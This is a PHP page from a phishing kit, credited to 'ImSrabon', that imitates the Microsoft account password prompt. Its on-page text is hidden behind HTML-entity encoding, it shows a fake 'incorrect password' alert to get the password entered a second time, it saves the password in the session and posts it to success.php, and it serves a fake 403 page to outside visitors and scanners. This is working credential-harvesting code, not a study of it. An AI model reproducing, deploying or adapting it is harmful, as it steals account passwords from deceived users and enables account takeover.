<?php
/*

  _____            _____           _                 
 |_   _|          / ____|         | |                
   | |  _ __ ___ | (___  _ __ __ _| |__   ___  _ __  
   | | | '_ ` _ \ \___ \| '__/ _` | '_ \ / _ \| '_ \ 
  _| |_| | | | | |____) | | | (_| | |_) | (_) | | | |
 |_____|_| |_| |_|_____/|_|  \__,_|_.__/ \___/|_| |_|
                                                     
                                                           
                                    ICQ: @ImSrabon
*/

@session_start();

$get_sessionid = $_GET["SESSION"];
//echo $get_sessionid;

// Retrive Session
$get_sess = $_SESSION["sess_id"];
session_id($get_sess);

$_SESSION["password"] = $_POST["password"];

require "includes/blocker1.php"; // ITS REQURED EVERY PAGE

// Check Session
if ($get_sessionid !== $get_sess) {
	print '
	<html><head>
	<title>403 - Forbidden</title>
	</head><body>
	<h1>403 Forbidden</h1>
	</p></p>
	<hr>
	</body></html>
	';
	exit();
}

/*
* Not allowed on GET
*/
if ($_SERVER["REQUEST_METHOD"] == "GET") {
	print '
	<html><head>
	<title>403 - Forbidden</title>
	</head><body>
	<h1>403 Forbidden</h1>
	</p></p>
	<hr>
	</body></html>
	';
	exit();
}

?>

<html dir="ltr">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head><link rel="shortcut icon" href="assets/favicon.ico" /><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><base /><title>&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</title><meta name="PageID" content="i4416"><meta name="SiteID" content="38936"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"/><style type="text/css">body{margin: 0;background-image: url("assets/bg.jpg");background-repeat: no-repeat,no-repeat; background-position: center center,center center; background-size: cover,cover;background-color: #fff;color: #000;font-family: "Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;font-weight: 400;font-size: 15px;line-height: 20px;}.outer{display: table;position: absolute;height: 100%;width: 100%;}.middle{display: table-cell;vertical-align: middle;}.inner{margin-left: auto;margin-right: auto;min-height: 350px;max-height: 350px;min-width: 275px;max-width: 350px;width: calc(100% - 40px);padding: 36px;margin-bottom: 28px;background-color: #fff;-webkit-box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.55);-moz-box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.55);box-shadow:0px 2px 3px rgba(0, 0, 0, 0.55);border: 1px solid #818C94;border: 1px solid rgba(0, 0, 0, 0.4);}.footer{position: fixed;bottom: 0px;width: 100%;overflow: visible;z-index: 99;clear: both;background-color: rgba(0, 0, 0, 0.6);}div.footerNode{margin: 0;float: right;}.form-group{margin-bottom: 16px;}.text-title{padding: 0;margin-top: 16px;margin-bottom: 12px;font-size: 24px;color: #404040;font-size: 1.5rem;line-height: 28px;font-weight: 600;line-height: 1.75rem;font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";}.text-title:lang(zh-cn), .text-title:lang(zh-tw){font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande","Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";}.relative{position: relative;}div.footerNode a,div.footerNode span{color: white;font-size: 12px;line-height: 28px;white-space: nowrap;display: inline-block;margin-left: 8px;margin-right: 8px;}a{text-decoration: none;}@media (max-width: 600px), (max-height: 392px){.middle{vertical-align: top;}.inner{-webkit-box-shadow: none;-moz-box-shadow: none;box-shadow: none;border: 0;padding: 24px;width: 100%;}.footer.default{background: white;}.footer.default div.footerNode a,.footer.default div.footerNode span{color: #777777;}div.footerNode{float: left;}}
.office-input{
	border-top: 0;
    border-left: 0;
    border-right: 0;
    padding-left: 0px;
    border-width: 1px;
    border-color: #e81123;
    height: 36px;
    outline: none;
    width: 100%;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent; 
    font-family: inherit;
    font-size: inherit;   
}
.office-input:hover {
	border-color: rgba(0,0,0,0.6);
}
.info {
	margin-top: 15px;
}
.info-text{
	font-size: 13px;
	margin-bottom: 13px;
}
.info-link {
	color: #0067b8;
}
.info-link:hover {
	color: #666666;
	text-decoration: underline;
	cursor: pointer;
}
.nextbtn {
    border-color: #0067b8;
    background-color: #0067b8;
    color: #fff;
    min-height: 32px;
    font-family: inherit;
    font-size: inherit;
    width: 100%;
}
.nextbtn:hover {
    border-color: #005DA6;
    background-color: #005DA6;
    cursor: pointer;
}
.btn-block {
    text-align: right;
    float: right;
    width: 100px;
}
.identityBanner {
	height: 24px;
    background: #fff;
    margin-top: 16px;
    margin-bottom: -4px;
}
.keepsignin {
	cursor: pointer;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
}
#keepsignin {
	width: 20px;
    height: 20px;
    margin-left: 0px;
    padding-top: -10px;
}
.chksignin {
	margin-top: 0px;
	margin-bottom: 0px;
}
.alert-text {
	color: #e81123;
}
.backButton {
	min-height:24px;
	width:24px;
	min-width:24px;
	float:left;
	padding:0;
	background-color:#fff;
	border-width:0;
	border-radius:12px;
	margin-right:2px;
	cursor: pointer;
}
.backButton:hover {
	background-color:#e6e6e6;
	background-color:rgba(0,0,0,.1)
}
.backButton:hover:focus {
	background-color:#ccc;
	background-color:rgba(0,0,0,.2)
}
.backButton:active {
	background-color:#b3b3b3;
	background-color:rgba(0,0,0,.3)
}
.backButton:focus {
	background-color:#e6e6e6;
	background-color:rgba(0,0,0,.1);
	outline:none
}
.identity {
    line-height: 24px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}
         .animated {
            -webkit-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
         }
         
         @-webkit-keyframes fadeInRight {
            0% {
               opacity: 0;
               -webkit-transform: translateX(20px);
            }
            100% {
               opacity: 1;
               -webkit-transform: translateX(0);
            }
         }
         
         @keyframes fadeInRight {
            0% {
               opacity: 0;
               transform: translateX(30px);
            }
            100% {
               opacity: 1;
               transform: translateX(0);
            }
         }
         
         .fadeInRight {
            -webkit-animation-name: fadeInRight;
            animation-name: fadeInRight;
        }
</style></head><body><div><div class="outer" id="idHeaderTD9"><div class="middle"><div class="inner relative"><img src="assets/logo.svg" class="logo" alt="Microsoft account" />
	<div class="identityBanner"><div id="displayName" class="identity">
		<button class="backButton" onclick="history.back()"><img src="assets/arrow-left.svg"></button>
		<div class="identity"><?php echo $_SESSION["email"]; ?></div></div> </div>
<div class="content animated fadeInRight">
	<div id="jsDisabledTitle" class="row text-title" role="heading">&#69;&#110;&#116;&#101;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</div>
	<form name="login" onsubmit="return validateForm()" autocomplete="off" method="POST" action="success.php?SESSION=<?php echo $get_sess; ?>" required>
		<div class="alert" id="alert" style="display: none;">
			<span class="alert-text">&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#101;&#110;&#116;&#101;&#114;&#32;&#116;&#104;&#101;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#102;&#111;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#46;</span>
		</div>
		<div class="alert" id="alert1">
			<span class="alert-text">&#89;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#111;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#105;&#115;&#32;&#105;&#110;&#99;&#111;&#114;&#114;&#101;&#99;&#116;&#46;&#32;&#73;&#102;&#32;&#121;&#111;&#117;&#32;&#100;&#111;&#110;&#39;&#116;&#32;&#114;&#101;&#109;&#101;&#109;&#98;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#44;&#32;<span class="reset-text info-link">&#114;&#101;&#115;&#101;&#116;&#32;&#105;&#116;&#32;&#110;&#111;&#119;&#46;</span></span>
		</div>
		<input type="password" name="password_cfrm" id="password_cfrm" class="office-input" placeholder="Password" autofocus>
		<div class="info">
			<div class="chksignin">
				<input type="checkbox" id="keepsignin" name="keepsignin" value="keepsignin">
				<label for="keepsignin" class="keepsignin">&#32;&#75;&#101;&#101;&#112;&#32;&#109;&#101;&#32;&#115;&#105;&#103;&#110;&#101;&#100;&#32;&#105;&#110;</label>
			</div>
			<p><span class="info-text info-link">&#70;&#111;&#114;&#103;&#111;&#116;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#63;</span></p>
			<p><span class="info-text info-link">&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#119;&#105;&#116;&#104;&#32;&#87;&#105;&#110;&#100;&#111;&#119;&#115;&#32;&#72;&#101;&#108;&#108;&#111;&#32;&#111;&#114;&#32;&#97;&#32;&#115;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#32;&#107;&#101;&#121;</span></p>
		</div>
		<div class="bottom">
			<div class="btn-block">
				<button class="nextbtn" type="submit" name="submit">&#83;&#105;&#103;&#110;&#32;&#105;&#110;</button>
			</div>
		</div>
	</form>
<script>
function validateForm() {
  var x = document.forms["login"]["password_cfrm"].value;

  if (x == "" || x == null) {
    document.getElementById('alert').style.display = "block";
    document.getElementById('alert1').style.display = "none";
    document.getElementById('password_cfrm').style.borderColor='#e81123';
    document.getElementById('password_cfrm').focus();
    return false;
  }
}
</script>
</div>
</div></div></div><div class="footer default"><div class="footerNode"><span><a href="#">&#84;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#117;&#115;&#101;</a></span><span><a href="#">Pr&#105;&#118;&#97;&#99;&#121; & cookies</a></span></div></div></div></body>

</html>